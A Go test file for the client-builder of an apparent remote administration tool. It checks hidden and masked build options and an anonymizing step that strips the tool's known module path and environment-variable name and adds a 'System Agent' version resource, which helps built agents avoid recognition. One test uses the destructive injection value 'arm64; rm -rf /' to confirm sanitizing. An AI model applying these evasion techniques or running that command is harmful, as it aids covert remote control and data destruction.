package client

import (
	"bytes"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
)

type fakeBuildAuthService struct{}

func (fakeBuildAuthService) GetSecret() (string, error) { return "test-secret", nil }
func (fakeBuildAuthService) RefreshSecret() (string, error) {
	return "test-secret", nil
}
func (fakeBuildAuthService) GetAuthConfig() (*entities.Auth, error) {
	return &entities.Auth{SecretKey: "test-secret"}, nil
}

func TestGetEnvVarBuild(t *testing.T) {
	env := getEnvVarBuild("darwin", "arm64")

	for _, expected := range []string{"GOOS=darwin", "GOARCH=arm64", "CGO_ENABLED=0"} {
		if !strings.Contains(env, expected) {
			t.Errorf("getEnvVarBuild() = %q, want it to contain %q", env, expected)
		}
	}

	if system.DetectOS() == system.Windows {
		if !strings.HasSuffix(env, "&") {
			t.Errorf("getEnvVarBuild() = %q, want it to end with a command separator", env)
		}
	} else if strings.Contains(env, "&") {
		t.Errorf("getEnvVarBuild() = %q, want no command separator", env)
	}
}

func TestBuildFilename(t *testing.T) {
	if got := buildFilename(system.Windows, "agent", false); got != "agent.exe" {
		t.Errorf("buildFilename(Windows) = %q, want %q", got, "agent.exe")
	}
	if got := buildFilename(system.Darwin, "agent", false); got != "agent" {
		t.Errorf("buildFilename(Darwin) = %q, want %q", got, "agent")
	}
	if got := buildFilename(system.Linux, "agent", false); got != "agent" {
		t.Errorf("buildFilename(Linux) = %q, want %q", got, "agent")
	}
}

func TestBuildFilenameDefaultsForHiddenClients(t *testing.T) {
	if got := buildFilename(system.Linux, "", true); got != hiddenLinuxFilename {
		t.Errorf("buildFilename(Linux, hidden) = %q, want %q", got, hiddenLinuxFilename)
	}
	if got := buildFilename(system.Darwin, "", true); got != hiddenMacFilename {
		t.Errorf("buildFilename(Darwin, hidden) = %q, want %q", got, hiddenMacFilename)
	}
	if got := buildFilename(system.Linux, "", false); got == hiddenLinuxFilename {
		t.Errorf("buildFilename(Linux, visible) = %q, want a random name", got)
	}
	if got := buildFilename(system.Windows, "", true); !strings.HasSuffix(got, ".exe") || got == ".exe" {
		t.Errorf("buildFilename(Windows, hidden) = %q, want a random .exe name", got)
	}
}

func TestGetBuildFlags(t *testing.T) {
	tests := []struct {
		name   string
		target system.OSType
		hidden bool
		mask   bool
		want   string
	}{
		{"windows hidden", system.Windows, true, true, "-H=windowsgui"},
		{"linux hidden", system.Linux, true, false, "-X 'main.RunHidden=true'"},
		{"darwin masked", system.Darwin, false, true, "-X 'main.MaskName=true'"},
		{"linux hidden and masked", system.Linux, true, true, "-X 'main.RunHidden=true' -X 'main.MaskName=true'"},
		{"windows visible", system.Windows, false, false, ""},
		{"linux visible", system.Linux, false, false, ""},
	}

	for _, test := range tests {
		if got := getBuildFlags(test.target, test.hidden, test.mask); got != test.want {
			t.Errorf("%s: getBuildFlags() = %q, want %q", test.name, got, test.want)
		}
	}
}

func TestBuildClientBinaryInputGetOSArch(t *testing.T) {
	input := BuildClientBinaryInput{OSTarget: system.Darwin}
	if got := input.GetOSArch(); got != "amd64" {
		t.Errorf("GetOSArch() = %q, want the default %q", got, "amd64")
	}

	input.OSArch = "arm64"
	if got := input.GetOSArch(); got != "arm64" {
		t.Errorf("GetOSArch() = %q, want %q", got, "arm64")
	}

	input.OSArch = "arm64; rm -rf /"
	if got := input.GetOSArch(); got != "arm64rmrf" {
		t.Errorf("GetOSArch() = %q, want sanitized %q", got, "arm64rmrf")
	}
}

func TestBuildClientForDarwin(t *testing.T) {
	workingDir, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	rootDir := filepath.Join(workingDir, "..", "..")
	if err := os.Chdir(rootDir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(workingDir) })

	service := NewClientService(
		"test",
		&environment.Configuration{Server: environment.Server{Port: "8080"}},
		nil,
		fakeBuildAuthService{},
	)

	filename, err := service.BuildClient(BuildClientBinaryInput{
		ServerAddress: "127.0.0.1",
		ServerPort:    "8080",
		OSTarget:      system.Darwin,
		OSArch:        "arm64",
		Filename:      "chaosdarwintest",
	})
	if err != nil {
		t.Fatalf("BuildClient() error = %v", err)
	}
	t.Cleanup(func() { _ = os.Remove(filepath.Join("temp", filename)) })

	if filename != "chaosdarwintest" {
		t.Errorf("BuildClient() filename = %q, want %q", filename, "chaosdarwintest")
	}
	if _, err := os.Stat(filepath.Join("temp", filename)); err != nil {
		t.Errorf("built client was not written to the temp directory: %v", err)
	}

	output, err := os.ReadFile(filepath.Join("temp", filename))
	if err != nil {
		t.Fatal(err)
	}
	machoMagic := []byte{0xCF, 0xFA, 0xED, 0xFE}
	if len(output) < len(machoMagic) || !bytes.Equal(output[:len(machoMagic)], machoMagic) {
		t.Errorf("built client does not have a Mach-O header, got %x", output[:4])
	}
}

func TestBuildClientRejectsInvalidArch(t *testing.T) {
	service := NewClientService("test", &environment.Configuration{}, nil, fakeBuildAuthService{})

	_, err := service.BuildClient(BuildClientBinaryInput{
		ServerAddress: "127.0.0.1",
		ServerPort:    "8080",
		OSTarget:      system.Windows,
		OSArch:        "arm64",
	})
	if err != internal.ErrInvalidOSArch {
		t.Errorf("BuildClient() error = %v, want %v", err, internal.ErrInvalidOSArch)
	}
}

func TestRandomModulePath(t *testing.T) {
	path := randomModulePath()

	parts := strings.Split(path, "/")
	if len(parts) != 3 || parts[0] != "github.com" {
		t.Fatalf("randomModulePath() = %q, want a github.com/<owner>/<repo> path", path)
	}
	for _, part := range parts[1:] {
		if part != strings.ToLower(part) || len(part) == 0 {
			t.Errorf("randomModulePath() = %q, want lowercase non-empty path segments", path)
		}
	}

	if path == randomModulePath() {
		t.Error("randomModulePath() returned the same path twice")
	}
}

func TestRandomEnvVarName(t *testing.T) {
	name := randomEnvVarName()

	if name == hiddenEnvVarName {
		t.Errorf("randomEnvVarName() = %q, want a name different from %q", name, hiddenEnvVarName)
	}
	if !strings.Contains(name, "_") || name != strings.ToUpper(name) {
		t.Errorf("randomEnvVarName() = %q, want an uppercase NAME_LOOKING variable", name)
	}
}

func TestBuildVersion(t *testing.T) {
	if got := buildVersion(" 2.1.0 "); got != "2.1.0" {
		t.Errorf("buildVersion(%q) = %q, want %q", " 2.1.0 ", got, "2.1.0")
	}

	got := buildVersion("dev")
	if got == "dev" || got == "" {
		t.Errorf("buildVersion(%q) = %q, want a generated version", "dev", got)
	}
	if matched, _ := regexp.MatchString(`^[1-5]\.\d\.\d$`, got); !matched {
		t.Errorf("buildVersion(%q) = %q, want a semantic version", "dev", got)
	}
}

func TestAnonymizeRuntimeDirectory(t *testing.T) {
	buildPath := t.TempDir()
	mainFile := filepath.Join(buildPath, "app.go")
	goModFile := filepath.Join(buildPath, "go.mod")

	mainSource := `package main

import "` + clientModulePath + `/app"

const envVar = "` + hiddenEnvVarName + `"
`
	goModSource := "module " + clientModulePath + "\n\ngo 1.22.3\n"

	if err := os.WriteFile(mainFile, []byte(mainSource), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(goModFile, []byte(goModSource), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(buildPath, "res_windows_amd64.syso"), []byte(clientModulePath), 0o600); err != nil {
		t.Fatal(err)
	}

	if err := anonymizeRuntimeDirectory(buildPath); err != nil {
		t.Fatalf("anonymizeRuntimeDirectory() error = %v", err)
	}

	source, err := os.ReadFile(mainFile)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(source), clientModulePath) {
		t.Errorf("main.go still contains %q:\n%s", clientModulePath, source)
	}
	if strings.Contains(string(source), `"`+hiddenEnvVarName+`"`) {
		t.Errorf("main.go still contains the %q environment variable:\n%s", hiddenEnvVarName, source)
	}
	if !strings.Contains(string(source), "github.com/") {
		t.Errorf("main.go has no module import left:\n%s", source)
	}

	goMod, err := os.ReadFile(goModFile)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(goMod), clientModulePath) {
		t.Errorf("go.mod still contains %q:\n%s", clientModulePath, goMod)
	}

	extra, err := os.ReadFile(filepath.Join(buildPath, "res_windows_amd64.syso"))
	if err != nil {
		t.Fatal(err)
	}
	if string(extra) != clientModulePath {
		t.Errorf("binary .syso was modified: %q", extra)
	}
}

func TestBuildClientAnonymizesIdentifiers(t *testing.T) {
	workingDir, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	rootDir := filepath.Join(workingDir, "..", "..")
	if err := os.Chdir(rootDir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(workingDir) })

	service := NewClientService(
		"dev",
		&environment.Configuration{Server: environment.Server{Port: "8080"}},
		nil,
		fakeBuildAuthService{},
	)

	filename, err := service.BuildClient(BuildClientBinaryInput{
		ServerAddress: "127.0.0.1",
		ServerPort:    "8080",
		OSTarget:      system.Windows,
		Filename:      "chaosantest",
	})
	if err != nil {
		t.Fatalf("BuildClient() error = %v", err)
	}
	t.Cleanup(func() { _ = os.Remove(filepath.Join("temp", filename)) })

	output, err := os.ReadFile(filepath.Join("temp", filename))
	if err != nil {
		t.Fatal(err)
	}
	if len(output) < 2 || string(output[:2]) != "MZ" {
		t.Fatalf("built client is not a PE file, got %x", output[:2])
	}
	if bytes.Contains(output, []byte(clientModulePath)) {
		t.Errorf("built client contains the well-known module path %q", clientModulePath)
	}
	if bytes.Contains(output, []byte(hiddenEnvVarName)) {
		t.Errorf("built client still contains the %q environment variable", hiddenEnvVarName)
	}
	utf16VersionInfo := utf16LE("System Agent")
	if !bytes.Contains(output, utf16VersionInfo) {
		t.Error("built client has no version resource")
	}
}

// utf16LE encodes a string the way the Windows resource section stores it.
func utf16LE(value string) []byte {
	encoded := make([]byte, 0, len(value)*2)
	for _, r := range value {
		encoded = append(encoded, byte(r), byte(r>>8))
	}
	return encoded
}
